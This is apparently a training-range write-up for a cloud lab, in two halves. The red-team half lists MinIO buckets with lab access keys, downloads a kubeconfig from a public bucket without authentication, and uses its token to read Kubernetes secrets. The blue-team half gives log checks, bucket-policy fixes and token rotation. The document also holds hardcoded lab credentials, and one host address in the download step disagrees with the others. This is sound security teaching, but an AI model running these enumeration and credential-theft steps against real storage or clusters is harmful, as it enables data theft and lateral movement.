# GRIDFALL CLD01 M2 Public Bucket Kubeconfig Red vs Blue Writeup

## Red Team Writeup

# Solve Guide â€” Red Team
## RNG-CLD-01 | M2 â€” cld-storage | Misconfigured Public Cloud Storage Bucket
**Technique:** T1530 â€” Data from Cloud Storage Object  
**Pivot In:** AccessKeyId: AKIAPUL2024CLDSVC01 / SecretAccessKey: pULcLd/S3cr3t2024/K3y!  

## Objective
Enumerate the MinIO S3-compatible storage, discover the misconfigured public bucket, and extract the Kubernetes kubeconfig containing the service account token for M3.

## Step 1 â€” Discover MinIO
```bash
nmap -sV -p 9000,9001 193.0.1.91
# 9000/tcp open MinIO S3 API
# 9001/tcp open MinIO Console
```

<img width="2292" height="939" alt="image" src="https://github.com/user-attachments/assets/1a88677a-55a6-4b3d-822e-819247e57fb6" />


## Step 2 â€” List Buckets Using Stolen Credentials

**Using AWS CLI:**
```bash
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
export AWS_DEFAULT_REGION=us-east-1

aws s3 ls --endpoint-url http://193.0.1.91:9000
# Buckets:
#   pul-cloud-backups
#   pul-cloud-internal
```
<img width="2544" height="1438" alt="image" src="https://github.com/user-attachments/assets/e33c762c-53dd-4123-b148-ae184fa16d58" />


## Step 3 â€” Enumerate the Public Bucket (No Auth Required)

`pul-cloud-backups` has a public anonymous read+list policy â€” it can be accessed without credentials:

```bash
# List via S3 list-type=2 API (no auth):
curl -s "http://193.0.1.91:9000/pul-cloud-backups?list-type=2" | grep -oP '(?<=<Key>)[^<]+'

# Or with credentials (shows same result):
aws s3 ls s3://pul-cloud-backups/ --recursive --endpoint-url http://193.0.1.91:9000
```

Output â€” key directories:
```
backups/db-backup-2024-11-14.sql.enc
backups/config-backup-note.txt
configs/deployment-notes.txt
k8s/cloud-ci-kubeconfig.yaml       â† TARGET
k8s/cluster-info.txt
README.txt
```

<img width="2557" height="1473" alt="image" src="https://github.com/user-attachments/assets/7a077880-2af8-475c-909e-cb25e1633ada" />


## Step 4 â€” Download the Kubeconfig

```bash
# Direct download (no credentials â€” public bucket):
curl -o cloud-ci-kubeconfig.yaml \
    http://11.0.2.20:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml

# Inspect it:
cat cloud-ci-kubeconfig.yaml
```


Key content:
```yaml
users:
- name: cloud-ci-runner
  user:
    token: pul-cloud-ci-runner-token-2024gridfall
```

<img width="1192" height="809" alt="image" src="https://github.com/user-attachments/assets/ad23e916-7eb7-4353-890c-23de480b7d35" />


The kubeconfig points to `https://193.0.3.80:6443` â€” the K3s API server on M3.

## Step 5 â€” Verify Token Works Against M3

```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml
kubectl get secrets -n pul-cloud
# NAME             TYPE     DATA
# registry-creds   Opaque   4
# db-creds         Opaque   5
```

Pivot to M3 confirmed. Token grants read access to secrets in `pul-cloud` namespace.

<img width="1257" height="476" alt="image" src="https://github.com/user-attachments/assets/d993a486-6561-4226-a5f1-56ad4ed3ef8c" />


## Summary
| Item | Value |
|---|---|
| Misconfiguration | Public read+list policy on pul-cloud-backups bucket |
| Stolen Artifact | k8s/cloud-ci-kubeconfig.yaml â€” K8s SA token |
| K8s Token | pul-cloud-ci-runner-token-2024gridfall |
| Next Target | M3 K3s API (193.0.3.80:6443) |
| MITRE | T1530 |

---

## Blue Team Writeup

# Solve Guide â€” Blue Team
## RNG-CLD-01 | M2 â€” cld-storage | Misconfigured Bucket Detection & Response

## Detection

### 1. MinIO Access Logs
```bash
journalctl -u pul-minio | grep "pul-cloud-backups/k8s" | tail -30
# Look for: GET /pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml 200
```

### 2. Detect Unauthenticated Downloads
Any download of `k8s/cloud-ci-kubeconfig.yaml` without `Authorization: AWS4-HMAC-SHA256` header is a red flag since the bucket shouldn't be public:
```bash
journalctl -u pul-minio | grep "cloud-ci-kubeconfig" | grep -v "AKIAPUL2024CLDSVC01"
```

### 3. Check Bucket Policy
```bash
export MC_HOST_pulminio="http://AKIAPUL2024CLDSVC01:pULcLd%2FS3cr3t2024%2FK3y!@127.0.0.1:9000"
mc policy get pulminio/pul-cloud-backups
# If it says "public", this is the misconfiguration
```

## Containment
```bash
# 1. Remove public policy â€” require authentication for all bucket access
mc anonymous set none pulminio/pul-cloud-backups

# 2. Rotate the K8s token immediately (on M3):
# Delete the static token from /etc/rancher/k3s/tokens.csv and restart K3s
# Or update the token value to invalidate the stolen one

# 3. Move sensitive files out of this bucket entirely:
mc mv pulminio/pul-cloud-backups/k8s/ pulminio/pul-cloud-internal/k8s/
```

## Remediation
1. **Never store credentials, tokens, or kubeconfigs in object storage** â€” use a secrets manager (Vault, K8s Secrets, AWS Secrets Manager)
2. Enable bucket access logging and alert on any public bucket policy change
3. Implement bucket-level notifications for reads of sensitive key patterns (`*.yaml`, `*kubeconfig*`, `*.key`, `*.pem`)
4. Apply principle of least privilege: the `pul-cloud-role` IAM role should not have permission to set bucket policies
5. Scan all buckets periodically for public access: `mc anonymous list pulminio`

## Blue Team Checklist
- [ ] Unauthorized download of cloud-ci-kubeconfig.yaml confirmed
- [ ] Bucket policy corrected to private
- [ ] K8s SA token (pul-cloud-ci-runner-token-2024gridfall) rotated on M3
- [ ] MinIO credentials (AKIAPUL2024CLDSVC01) rotated
- [ ] All bucket contents audited for other sensitive files
- [ ] Alert rule added for public bucket policy on this MinIO instance

